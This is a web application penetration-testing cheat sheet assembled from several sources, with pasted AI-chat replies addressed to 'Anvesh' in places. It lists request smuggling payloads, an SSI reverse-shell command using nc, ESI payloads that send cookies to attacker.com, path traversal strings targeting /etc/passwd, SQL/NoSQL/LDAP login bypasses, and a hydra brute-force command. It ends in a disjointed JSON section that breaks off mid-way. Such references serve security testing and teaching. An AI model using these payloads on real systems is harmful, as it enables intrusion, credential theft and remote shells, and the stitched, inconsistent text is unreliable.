* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

# **1. List of Vulnerabilities**

```
1.1 CL.TE (Content-Length vs Transfer-Encoding mismatch)
1.2 TE.CL (Transfer-Encoding vs Content-Length mismatch)
1.3 TE.TE (Dual Transfer-Encoding header collision)
1.4 Obfuscated Transfer-Encoding header bypass
1.5 H/2 to H/1 downgrading smuggling
1.6 HTTP/1.1 pipeline desync attacks
1.7 HTTP/2 request queue poisoning
1.8 Smuggling via folded headers (obsolete line folding)
1.9 Reverse proxy parsing inconsistencies (Nginx, HAProxy, Apache)
1.10 Response queue poisoning → Cache poisoning → Credential theft
```

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Basic learning/test payloads — safe)*

```
2.1 CL.TE Basic Smuggle
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
```

```
2.2 TE.CL Basic Smuggle
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
0

GET /pwned HTTP/1.1
Host: victim.com
```

```
2.3 Obfuscated TE Header
POST / HTTP/1.1
Host: victim.com
Transfer-Encoding : chunked
Content-Length: 6

0

X
```

```
2.4 Smuggling With Upper/Lower Case
Transfer-encoding: chunked
```

```
2.5 CL Overread Attempt
Content-Length: 100
<10-byte-body>
```

---

# **3. Sample Payloads (Updated With Real Payloads for Learning)**

*(Real offensive request smuggling payloads used in actual attacks)*

```
3.1 CL.TE Attack – Insert New Request
POST / HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim
```

```
3.2 TE.CL Attack – Admin Panel Access
POST /login HTTP/1.1
Host: victim
Transfer-Encoding: chunked
Content-Length: 5

1
A
0

GET /admin/dashboard HTTP/1.1
Host: victim
```

```
3.3 TE.TE Dual Header Collision
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
3.4 H2 → H1 Downgrade Smuggling
:method: POST
:scheme: https
:authority: victim.com
transfer-encoding: chunked

0

GET /private
```

```
3.5 Reverse Proxy Poisoning (Nginx → Apache)
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: victim
```

```
3.6 Cache Poisoning Smuggle
POST /cacheable HTTP/1.1
Host: victim
Content-Length: 16
Transfer-Encoding: chunked

0

GET /profile?user=admin HTTP/1.1
Host: victim
```

```
3.7 Header Injection via Smuggle
POST / HTTP/1.1
Host: victim
Content-Length: 33
Transfer-Encoding: chunked

0

GET / HTTP/1.1
X-Admin: true
```

```
3.8 Credential Theft (forward poisoning)
POST / HTTP/1.1
Host: victim
Content-Length: 10
Transfer-Encoding: chunked

0

GET /cookies HTTP/1.1
Host: victim
```

```
3.9 WAF Bypass → Hidden Admin
POST / HTTP/1.1
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
3.10 Chained Smuggle → Backend Command Trigger
0

POST /trigger?cmd=restart HTTP/1.1
Host: victim
```

---

# **4. Bypass Techniques (Filter Bypass, Header Obfuscation, WAF Evasion)**

```
4.1 TE Header Obfuscation
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```
4.2 Whitespaces Bypass
Transfer-Encoding : chunked
```

```
4.3 Tab Injection
Transfer-Encoding:\tchunked
```

```
4.4 Mixed Case Bypass
TrAnSfEr-EnCoDiNg: chunked
```

```
4.5 Duplicate Headers Bypass
Transfer-Encoding: chunked
Transfer-Encoding: cow
```

```
4.6 Chunked Body Obfuscation
1;ext=1
A
0
```

```
4.7 Line Folding (Obsolete RFC)
Transfer-Encoding:
 chunked
```

```
4.8 Encoded TE Header
Transfer-Encoding:%20chunked
```

```
4.9 Injecting Null Bytes
Transfer-Encoding: chunked%00
```

```
4.10 Multi-Proxy Parsing Confusion
Content-Length: 999
Transfer-Encoding: chunked
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 Smuggling → Cache Poisoning → Credential Hijack
Smuggle a malicious GET request that is stored in cache.
```

```
5.2 Smuggling → Internal Admin Endpoint Exposure
Inject:
GET /internal/admin HTTP/1.1
Host: victim
```

```
5.3 Smuggling → Web Application Firewall Bypass
Use obfuscated TE header + chunked body trick.
```

```
5.4 Smuggling → Session Fixation
Force backend to process attacker-controlled Set-Cookie.
```

```
5.5 Smuggling → JWT Kid Injection via Queued Request
Queue request modifying "kid" header used by backend.
```

```
5.6 Smuggling → SSRF via Backend Follow-Up Request
Inject:
GET http://127.0.0.1:8080/admin
```

```
5.7 Smuggling → Stored XSS Through Cache Poisoning
Inject malicious JavaScript into cacheable responses.
```
---

# Server Side Include Injection

> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.

## Summary

* [Methodology](#methodology)
* [Edge Side Inclusion](#edge-side-inclusion)
* [References](#references)

## Methodology

SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

SSI format: `<!--#directive param="value" -->`

| Description             | Payload                                  |
| ----------------------- | ---------------------------------------- |
| Print the date          | `<!--#echo var="DATE_LOCAL" -->`         |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`      |
| Print all the variables | `<!--#printenv -->`                      |
| Setting variables       | `<!--#set var="name" value="Rich" -->`   |
| Include a file          | `<!--#include file="/etc/passwd" -->`    |
| Include a file          | `<!--#include virtual="/index.html" -->` |
| Execute commands        | `<!--#exec cmd="ls" -->`                 |
| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Edge Side Inclusion

HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.

Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.

```ps1
Surrogate-Control: content="ESI/1.0"
```

| Description             | Payload                                  |
| ----------------------- | ---------------------------------------- |
| Blind detection         | `<esi:include src=http://attacker.com>`  |
| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| Include a file          | `<esi:include src="supersecret.txt">` |
| Display debug info      | `<esi:debug/>` |
| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
| Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
| Varnish Cache | Yes | No   | No      | Yes                       | Yes            |
| Fastly   | Yes      | No   | No      | No                        | Yes            |
| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |
| NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |


# XPATH Injection

> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Blind Exploitation](#blind-exploitation)
    * [Out Of Band Exploitation](#out-of-band-exploitation)
* [Labs](#labs)
* [References](#references)

## Tools

* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool

## Methodology

Similar to SQL injection, you want to terminate the query properly:

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### Blind Exploitation

1. Size of a string

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. Access a character with `substring`, and verify its value the `codepoints-to-string` function

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### Out Of Band Exploitation

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## Labs

* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## References

* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPATH Injection - OWASP - January 21, 2015](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))

# Zip Slip

> The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [References](#references)

## Tools

* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities
* [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives

## Methodology

The Zip Slip vulnerability is a critical security flaw that affects the handling of archive files, such as ZIP, TAR, or other compressed file formats. This vulnerability allows an attacker to write arbitrary files outside of the intended extraction directory, potentially overwriting critical system files, executing malicious code, or gaining unauthorized access to sensitive information.

**Example**: Suppose an attacker creates a ZIP file with the following structure:

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
```

When a vulnerable application extracts `malicious.zip`, the files are written to `/etc/passwd` and /`usr/local/bin/malicious_script.sh` instead of being contained within the extraction directory. This can have severe consequences, such as corrupting system files or executing malicious scripts.

* Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):

    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```

* Creating a ZIP archive containing a symbolic link:

    ```ps1
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```

For a list of affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

## References

* [Zip Slip - Snyk - June 5, 2018](https://github.com/snyk/zip-slip-vulnerability)
* [Zip Slip Vulnerability - Snyk - April 15, 2018](https://snyk.io/research/zip-slip-vulnerability)

## Directory traversal

Best Selection open the image tab and observe the path | common parameters to check | any place where file paths are input, such as URL parameters, form fields, or upload endpoints. https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/Brute-Force/Traversal_LFI.txt

## 🔍 Common Keywords for Directory Traversal Testing

- `file` - `filename` - `filepath` - `path` - `download` - `include` - `doc` - `page` - `template` - `view` - `folder`
---
## 📎 Typical Parameters in URLs or Forms - These keywords often appear in requests like:

- `?file=report.pdf`  - `?path=/documents/user1/`  - `?doc=manual.txt`  - `?download=/resources/book.pdf` - `?page=home.html`  - `?template=invoice.html`

🧪 **Test Tip:** Try injecting traversal payloads such as: - `../../../etc/passwd`   - `%2e%2e/%2e%2e/etc/passwd`

Observe server responses for unexpected file access or errors.

```
GET /image?filename=../../../etc/passwd 
```
## 🛠️ Directory Traversal Bypass Techniques

1. **Basic Traversal** |    - Use when no filtering is applied.   - Payload: `../../../../etc/passwd`
2. **Absolute Path Bypass** |    - Works when the app prepends a default directory and allows absolute paths.    - Payload: `/etc/passwd`
3. **Non-Recursive Filter Bypass** |   - Bypasses filters that strip `../` only once.     - Payload: `....//....//etc/passwd`
4. **Double URL Encoding** |    - Bypasses filters that decode input before checking.     - Payload: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
5. **Unicode Encoding** |    - Uses Unicode representations of `.` and `/`.     - Payload: `%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd`
6. **Overlong UTF-8 Encoding** |    - Exploits invalid UTF-8 sequences accepted by some decoders.     - Payload: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd`
7. **Null Byte Injection** |    - Bypasses file extension validation by truncating `.jpg`.     - Payload: `../../../etc/passwd%00.jpg`
8. **Path Prefix Validation Bypass** |    - Satisfies prefix check while still traversing directories.    - Payload: `/images/../../../etc/passwd`
9. **Mangled Path** |    - Confuses filters by duplicating traversal sequences.     - Payload: `/.../.../.../.../.../.../.../.../.../etc/passwd`
10. **Backslash Variant (Windows)** |     - Useful on Windows-based servers.     - Payload: `..\\..\\..\\windows\\win.ini`

## Authentication Testcases
**modular authentication test suite** in your preferred format — each case includes payloads, expected behavior, and vulnerable outcomes. Based on your GitHub methodology, this is ready for cheat sheets, scanner logic, or Burp/ZAP integration.

**1. Default Credentials Enumeration**  
Try common usernames and passwords.

`text`  
Payloads:  
```text
admin:admin  
root:root  
test:test  
admin:password  
user:123456  
```

✅ Expected: Default credentials disabled  
❌ Vulnerable: Login successful with weak/default creds

---

**2. SQL Injection Authentication Bypass**  
Inject SQL logic into login fields.

`text`  
Payloads:  
```text
' OR '1'='1  
admin'--  
' OR ''='  
" OR "1"="1  
```

✅ Expected: Input sanitized and parameterized  
❌ Vulnerable: Auth bypass via SQL injection

---

**3. NoSQL Injection Bypass**  
Exploit loose type checking in NoSQL backends.

`json`  
Payload:  
```json
{
  "username": "admin",
  "password": { "$ne": null }
}
```

✅ Expected: Strict type and schema validation  
❌ Vulnerable: Auth bypass via NoSQL logic

---

**4. XPath Injection Bypass**  
Inject XPath logic into XML-based login systems.

`text`  
Payloads:  
```text
' or '1'='1  
' or contains(name(),'admin')  
' or string-length(name())<10  
```

✅ Expected: Input sanitized  
❌ Vulnerable: XPath logic executed

---

**5. LDAP Injection Bypass**  
Inject LDAP filters to manipulate authentication.

`text`  
Payloads:  
```text
*)(uid=*))(|(uid=admin))  
admin)(|(uid=*))  
```

✅ Expected: LDAP filters escaped  
❌ Vulnerable: Auth bypass via LDAP logic

---

**6. JSON Parsing Abuse (Node.js)**  
Exploit object coercion in Node.js backends.

`json`  
Payload:  
```json
{
  "username": "admin",
  "password": { "password": 1 }
}
```

✅ Expected: Object parsing hardened  
❌ Vulnerable: Login bypass due to coercion

---

**7. Content-Type Mismatch Abuse**  
Send JSON body with `Content-Type: application/x-www-form-urlencoded`.

`http`  
Headers:  
```http
Content-Type: application/x-www-form-urlencoded
```

Body:  
```json
{ "username": "admin", "password": "admin" }
```

✅ Expected: Content-Type enforced  
❌ Vulnerable: Parser mismatch leads to bypass

---

**8. Boolean Logic Abuse**  
Use `true`, `false`, or `1=1` style payloads.

`json`  
Payload:  
```json
{
  "username": "admin",
  "password": true
}
```

✅ Expected: Type and value validated  
❌ Vulnerable: Boolean coercion accepted

---

**9. Parameter Pollution**  
Send duplicate parameters to confuse backend logic.

`http`  
Payload:  
```http
username=admin&username=guest&password=admin
```

✅ Expected: First/last param enforced  
❌ Vulnerable: Ambiguity leads to bypass

---

**10. Missing Parameter Handling**  
Omit one or both login fields.

`http`  
Payloads:  
```http
username=admin  
password=admin  
(no parameters)
```

✅ Expected: All required fields enforced  
❌ Vulnerable: Partial login accepted

Here you go, Anvesh — a **comprehensive authentication test case suite**, formatted for automation or integration into your GitHub project. I've expanded your initial entries to cover deeper logic, misconfigurations, and edge cases across typical auth mechanisms.

---

## 🔐 Complete Authentication Test Suite

Each section includes: payloads, expected behavior, and signs of vulnerability.

### 11. Password Field Type Check  
Ensure the password field isn’t rendered as plain text.

```html
<input type="text" name="password">
```

✅ Expected: `type="password"`  
❌ Vulnerable: Reveals password as typed

---

### 12. Session Token Mismanagement  
Test for token reuse and predictability.

```text
Session: JSESSIONID=1234, 1235, etc.
```

✅ Expected: Randomized, single-use tokens  
❌ Vulnerable: Predictable or reusable tokens

---

### 13. Authentication Token in URL  
Check if sensitive auth tokens appear in the URL.

```http
GET /dashboard?auth_token=abc123
```

✅ Expected: Tokens in headers or cookies  
❌ Vulnerable: Leaked via referrer or log

---

### 14. Improper Rate Limiting  
Test brute-force resistance with automation.

```bash
hydra -l admin -P passwords.txt https://target/login
```

✅ Expected: Lockout or CAPTCHA  
❌ Vulnerable: No throttle or detection

---

### 15. Login via GET Method  
Check if credentials are accepted via GET.

```http
GET /login?username=admin&password=admin
```

✅ Expected: POST required  
❌ Vulnerable: Logs may expose credentials

---

### 16. Cookie Replay Attack  
Reuse intercepted auth cookies.

```http
Cookie: sessionid=abc123
```

✅ Expected: Expiry or invalidation  
❌ Vulnerable: Replay grants access

---

### 17. Multi-Factor Authentication Bypass  
Test for MFA enforcement and logic flaws.

✅ Expected: MFA always triggered  
❌ Vulnerable: MFA skipped with direct link or certain flow

---

### 18. Password Reset Abuse  
Tamper with reset flows or enumerate emails.

```http
email=test@example.com  
email=admin@example.com
```

✅ Expected: Generic messages, rate limiting  
❌ Vulnerable: Enumeration or logic bypass

---

### 19. OAuth/OpenID Logic Abuse  
Test third-party login integrations.

✅ Expected: Token validation enforced  
❌ Vulnerable: Accepts expired/forged tokens

---

### 20. Social Engineering Vector  
Check for password hints or email contents that leak info.

✅ Expected: No sensitive hints or links  
❌ Vulnerable: Verbose error or info disclosures

---

## Access control vulnerabilities.

---

### **1. Vertical Privilege Escalation**
Accessing admin-only endpoints as a low-privilege user.

```http
GET /admin/deleteUser?id=123
```

✅ Expected: Access denied or redirected  
❌ Vulnerable: Non-admin can trigger admin action

---

### **2. Horizontal Privilege Escalation (IDOR)**
Manipulating IDs to access peer-level data.

```http
GET /user/profile?id=456
```

✅ Expected: Only own data is accessible  
❌ Vulnerable: Other user's info exposed

---

### **3. Unauthenticated Access to Protected Resources**
Reaching sensitive endpoints without logging in.

```http
GET /admin/config
```

✅ Expected: Redirect to login or 403  
❌ Vulnerable: Endpoint available pre-auth

---

### **4. Role Tampering via Client-Controlled Input**
Altering cookies or hidden fields to elevate access.

```http
Cookie: role=admin
```

✅ Expected: Server enforces actual role  
❌ Vulnerable: Role accepted from client input

---

### **5. HTTP Method Override**
Using unexpected methods to perform restricted actions.

```http
PUT /user/123/delete
```

✅ Expected: Unsupported method returns 405  
❌ Vulnerable: Method triggers privileged action

---

### **6. Referer-Based Authorization**
Attempting access based on spoofed `Referer` header.

```http
Referer: https://trusted.com/dashboard
```

✅ Expected: Server verifies session/auth  
❌ Vulnerable: Access granted purely via header

---

### **7. Routing Header Injection**
Using override headers to reach protected routes.

```http
X-Original-URL: /admin  
X-Rewrite-URL: /admin
```

✅ Expected: Header discarded or validated  
❌ Vulnerable: Header triggers protected route logic

---

### **8. Forced Browsing**
Enumerating undocumented paths without authorization.

```http
GET /admin/panel  
GET /config/debug
```

✅ Expected: 403 or 302 redirect  
❌ Vulnerable: Sensitive functions exposed

---

### **9. JWT/Signed Token Role Manipulation**
Modifying encoded tokens for elevated privileges.

```json
{
  "user": "guest",
  "role": "admin"
}
```

✅ Expected: Signature checked and rejected  
❌ Vulnerable: Role accepted without signature validation

---

### **10. CSRF on Privileged Action**
Exploiting lack of anti-CSRF on sensitive operations.

```html
<form action="https://target.com/deleteUser?id=123" method="POST">
  <input type="submit">
</form>
```

✅ Expected: CSRF token validation  
❌ Vulnerable: Action triggered with forged request

---
Absolutely, Anvesh — here’s an extended suite with additional **Access Control Bypass Techniques**, structured just like your original format for easy markdown integration and scanner automation.

---

### **11. Parameter Pollution for Bypass**
Injecting duplicate parameters to confuse backend logic.

```http
GET /admin?role=user&role=admin
```

✅ Expected: Strict role validation  
❌ Vulnerable: Privilege escalated via duplicate parameter

---

### **12. Query String Override in POST**
Injecting query parameters in POST requests that override body logic.

```http
POST /update  
Content-Length: …  
{ "role": "user" }  
GET /update?role=admin
```

✅ Expected: Body parameters preferred  
❌ Vulnerable: Query overrides server validation

---

### **13. JSON Structure Manipulation**
Tampering nested fields or using alternate key casing.

```json
{ "Role": "admin" }  
{ "role": ["user", "admin"] }
```

✅ Expected: Strong parsing and validation  
❌ Vulnerable: Elevation via malformed JSON

---

### **14. Path Traversal on Role Files**
Attempt to access privilege assignment files.

```http
GET /roles/../../admin/assignments.json
```

✅ Expected: Path blocked  
❌ Vulnerable: Privileged role file exposed

---

### **15. HTTP Parameter Pollution in Cookies**
Combining cookie and URL parameters for role escalation.

```http
GET /dashboard?user=guest  
Cookie: user=admin
```

✅ Expected: Cookie validated alone  
❌ Vulnerable: Mixed param leads to bypass

---

### **16. File Upload Role Assignment**
Upload XML/JSON config to manipulate roles.

```xml
<config><role>admin</role></config>
```

✅ Expected: Content structure validated  
❌ Vulnerable: Roles set via upload

---

### **17. Host Header Abuse for Role Assignment**
Manipulate host header to trick internal logic.

```http
Host: admin.internal  
GET /dashboard
```

✅ Expected: Host verified or ignored  
❌ Vulnerable: Admin context triggered

---

### **18. URL Encoded Role Injection**
Use encoding to bypass filters.

```http
GET /profile?role=%61%64%6D%69%6E
```

✅ Expected: Proper decoding and role enforcement  
❌ Vulnerable: Decoded role grants elevation

---

### **19. Cache Poisoning-Based Role Reuse**
Trigger cached admin responses with poisoned headers.

```http
X-Forwarded-Host: admin.site.com
```

✅ Expected: Cache segregated by auth  
❌ Vulnerable: Privileged content served

---

### **20. Case Sensitivity Bypass**
Access control checks fail due to inconsistent casing.

```http
GET /Admin/Config  
GET /ADMIN/config
```

✅ Expected: Case-insensitive access validation  
❌ Vulnerable: Admin page accessible by case

---
Certainly, Anvesh — here’s a curated set of **common access control-related parameters** for fuzzing, bypass detection, and privilege manipulation. They’re grouped by attack vector for direct use in Burp/ZAP payload sets, repeater automation, or active scan extensions.

---

### 🧪 **Role Elevation & Identity Switching**

```text
role, user_role, access_level, user_type, isAdmin, accountType, privilege, admin, is_superuser, group, permission, auth_level, clearance
```

---

### 🔍 **User Identification / IDOR Testing**

```text
id, user_id, account_id, uid, profile, target, member_id, token_id, record_id, ref, reference_id, object_id
```

---

### ⚙️ **Client-Controlled Access Logic (Cookies / Query / POST)**

```text
auth, logged_in, authenticated, session, sessionid, logged_user, active_user, context, login, cookie, state, role_token
```

---

### 🧩 **Backend Flags / Boolean Toggles**

```text
is_admin, admin_access, elevated, access_granted, validate_admin, user=guest&admin=true, verified=true, bypassACL=true
```

---

### 💡 **File/Path-Based Access Flags**

```text
path, filepath, file, include, resource, load, page, template, route, url, next, redirect, view, forward
```

---

### 🚪 **Header-Based Role Inference & Routing Manipulation**

```text
X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Host, X-User, Forwarded, Referer, Origin, X-Remote-User
```

---

### 🧬 **Token & Scope Manipulation**

```text
token, auth_token, access_token, bearer, jwt, ticket, scope, scopes, grant_type, credentials
```

---

### 🔓 **Misc Privilege Bypass Vectors**

```text
debug, internal, mode, env, sandbox, impersonate, sudo, emulate, execute_as, run_as, proxy_user
```

---
## automation-ready test suite for **Authentication Vulnerabilities**, formatted to match your previous access control layout. Each case includes a reproducible payload and expected behavior for Burp/ZAP integration or GitHub documentation.
---

### **1. Weak Password Policy**
Test for lack of complexity enforcement.

```text
Password: 123456
```

✅ Expected: Rejected due to weak policy  
❌ Vulnerable: Accepted without validation

---

### **2. Credential Stuffing / No Rate Limiting**
Automated login attempts with known credentials.

```http
POST /login  
username=admin&password=admin123
```

✅ Expected: Rate limiting or CAPTCHA  
❌ Vulnerable: Unlimited login attempts allowed

---

### **3. Default Credentials**
Login using vendor defaults.

```http
admin:admin  
root:toor
```

✅ Expected: Disabled or changed  
❌ Vulnerable: Default creds accepted

---

### **4. Missing Multi-Factor Authentication**
Login with only username/password.

```http
POST /login  
username=admin&password=admin123
```

✅ Expected: MFA prompt  
❌ Vulnerable: Full access without second factor

---

### **5. Insecure Password Reset**
Reset without verifying identity.

```http
POST /reset  
email=admin@example.com
```

✅ Expected: Token or challenge required  
❌ Vulnerable: Password reset without verification

---

### **6. Username Enumeration**
Different responses for valid vs invalid usernames.

```http
POST /login  
username=admin&password=wrongpass
```

✅ Expected: Generic error message  
❌ Vulnerable: Reveals valid usernames

---

### **7. Session Fixation**
Reuse session ID across login.

```http
GET /login  
Set-Cookie: sessionid=abc123
```

✅ Expected: New session issued post-login  
❌ Vulnerable: Session remains unchanged

---

### **8. Insecure Token Storage**
Tokens stored in localStorage or exposed in JS.

```js
localStorage.setItem("token", "JWT...")
```

✅ Expected: HttpOnly cookie or secure storage  
❌ Vulnerable: Token accessible via JS

---

### **9. Brute Force via GraphQL/REST**
Automated login via API endpoints.

```graphql
mutation { login(username:"admin", password:"123456") }
```

✅ Expected: Rate limiting or lockout  
❌ Vulnerable: No protection on API login

---

### **10. Password in URL / Logs**
Sensitive credentials passed via GET.

```http
GET /login?username=admin&password=123456
```

✅ Expected: POST method only  
❌ Vulnerable: Password exposed in logs

---

Let me know if you want:
- 🔁 Fuzzable parameter list for auth vectors
- 🧪 Burp/ZAP config blocks for brute force, token leakage, and MFA bypass
- 📜 Markdown checklist with anchors for GitHub repo integration

Absolutely, Anvesh — here’s the **extended authentication test suite**, continuing in your preferred modular format. These cases cover advanced bypasses, token abuse, and protocol misconfigurations for Burp/ZAP automation or GitHub integration.

---

### **11. OAuth Token Misuse**
Using access tokens across unrelated services.

```http
Authorization: Bearer <token_from_other_app>
```

✅ Expected: Token scoped and validated  
❌ Vulnerable: Token accepted across domains

---

### **12. JWT Signature Bypass**
Tampering with JWT algorithm or signature.

```json
{
  "alg": "none",
  "payload": { "role": "admin" }
}
```

✅ Expected: Signature verified  
❌ Vulnerable: Token accepted without validation

---

### **13. SSO Trust Abuse**
Login via untrusted identity provider.

```http
SSO login via attacker-controlled IdP
```

✅ Expected: IdP whitelisted  
❌ Vulnerable: Any IdP accepted

---

### **14. Token Replay**
Reuse of expired or intercepted tokens.

```http
Authorization: Bearer <old_token>
```

✅ Expected: Token expiration enforced  
❌ Vulnerable: Token reused successfully

---

### **15. Password Reset Token Leakage**
Token exposed in logs or referrer headers.

```http
GET /reset?token=abc123
```

✅ Expected: Token short-lived and scoped  
❌ Vulnerable: Token leaked or reused

---

### **16. Insecure Redirect After Login**
Redirect to attacker-controlled domain.

```http
GET /login?redirect=https://evil.com
```

✅ Expected: Redirect validated  
❌ Vulnerable: Open redirect allowed

---

### **17. Missing Logout Invalidation**
Session remains active after logout.

```http
GET /logout  
→ Session cookie still valid
```

✅ Expected: Session destroyed  
❌ Vulnerable: Reuse of old session

---

### **18. Session Timeout Misconfiguration**
Session persists beyond expected duration.

```http
Idle for 30+ mins → Still logged in
```

✅ Expected: Session expired  
❌ Vulnerable: Session remains active

---

### **19. MFA Bypass via API**
Login via API skips MFA enforcement.

```http
POST /api/login  
→ No MFA challenge
```

✅ Expected: MFA enforced across channels  
❌ Vulnerable: API login skips MFA

---

### **20. Password Change Without Old Password**
Change password without verifying current one.

```http
POST /change-password  
new_password=123456
```

✅ Expected: Old password required  
❌ Vulnerable: Password changed without auth

---
Absolutely, Anvesh — here’s a **comprehensive, automation-ready test suite** for **JSON Injection**, including cases that can lead to **XSS vulnerabilities** when improperly parsed or rendered. Each case is modular, reproducible, and formatted for Burp/ZAP, GitHub, or scripting workflows.

---

### **1. Basic JSON Injection (Server-Side)**  

Here are **only the testcase names** taken **exactly from the section you mentioned (“✅ Complete JSON Security Test Cases + Safe Testing Payloads”)** — *nothing added, nothing removed*.

---

# ✅ **JSON Testcase Names (Exactly From the Earlier List)**

### **1. JSON Injection**

1. JSON Key/Value Injection
2. Boolean Override
3. JSON Key Injection (duplicate entries merged)
4. JSON Unicode Bypass

---

### **2. Authentication Bypass (JSON Body Manipulation)**

5. Remove Auth Fields
6. Null Auth Fields
7. Empty Structures

---

### **3. JSON Parameter Pollution (JPP)**

8. Duplicate Keys
9. Nested Pollution

---

### **4. Type Confusion Attacks**

10. String → Array
11. Integer → Object
12. Boolean → String

---

### **5. JSON Special Character Injection**

13. Escape/Break JSON Parser
14. Unicode Bypass (repeated category)

---

### **6. Mass Assignment / Overposting**

15. Unauthorized Sensitive Fields
16. Hidden/Internal Parameters

---

### **7. JSON Schema Bypass**

17. Extra Random Fields
18. Remove Required Field

---

### **8. JSON Web Token (JWT) in JSON Bodies**

19. JWT Algorithm Confusion
20. Fake Claims

---

### **9. JSON → SSRF**

21. URL Field Manipulation (SSRF)
22. DNS Exfil Mock (SSRF)

---

### **10. JSON Insecure Deserialization**

23. Prototype Pollution via **proto**
24. Constructor Pollution

---

### **11. JSON → XSS (Client-Side Rendering Attacks)**

25. Stored/Reflected XSS via JSON Field
26. SVG Payload Injection

---

### **12. JSONB / PostgreSQL Injection**

27. JSONB Injection

---

### **13. NoSQL (MongoDB) Injection via JSON**

28. NoSQL `$ne` Injection
29. NoSQL `$regex` Injection

---

### **14. JSONPath Injection**

30. JSONPath Wildcard Injection

---

